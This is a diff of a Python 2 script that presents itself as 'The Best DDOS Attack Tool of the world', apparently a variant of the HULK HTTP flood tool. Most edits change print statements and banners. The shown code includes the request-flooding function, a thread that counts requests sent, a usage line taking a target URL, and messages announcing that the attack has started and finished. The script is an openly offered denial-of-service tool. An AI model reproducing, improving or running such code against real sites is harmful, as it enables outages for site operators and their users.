@@ -11,8 +11,7 @@ print("@@@@@@@     @@       @@          @     @        @@     @@      @@        
 print("      @     @@@@@@@@@@@         @@@@@@@@@       @@        @@   @@            @@                   @         @                @")
 print("      @     @@       @@        @         @      @@          @@ @@            @@                   @         @                @")
 print("@@@@@@@     @@       @@       @           @     @@            @@@            @@                   @@@@@@@@@@@        @@@@@@@@@") 
-print("                                                                                                                                ")
-print("                                                                                                                                ")
+
 print("                                             The Best DDOS Attack Tool of the world                                     ")
 
 
@@ -72,10 +71,10 @@ def buildblock(size):
 	return(out_str)
 
 def usage():
-	print ('---------------------------------------------------')
-	print ('USAGE: python2 DDOS_ATTACK_Tool.py <url>')
-	print ('you can add "safe" after url, to autoshut after dos')
-	print ('---------------------------------------------------')
+	print '---------------------------------------------------'
+	print 'USAGE: python2 DDOS_ATTACK_TOOL.py <url>'
+	print 'you can add "safe" after url, to autoshut after dos'
+	print '---------------------------------------------------'
 
 	
 #http request
@@ -100,7 +99,7 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
-			print ('Code is responceing')
+			print 'One of the most powerfull DDOS attack tool (responce code : 500)'
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
@@ -128,10 +127,10 @@ class MonitorThread(threading.Thread):
 		previous=request_counter
 		while flag==0:
 			if (previous+100<request_counter) & (previous<>request_counter):
-				print ("%d Requests Sent") % (request_counter)
+				print "%d Requests Sent" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print ("\n-- Attack Finished --")
+			print "\n-- Attack Finished --"
 
 #execute 
 if len(sys.argv) < 2:
@@ -142,7 +141,7 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print ("-- One Of the most Dangerous attack is running XD --")
+		print "-- HULK Attack Started --"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
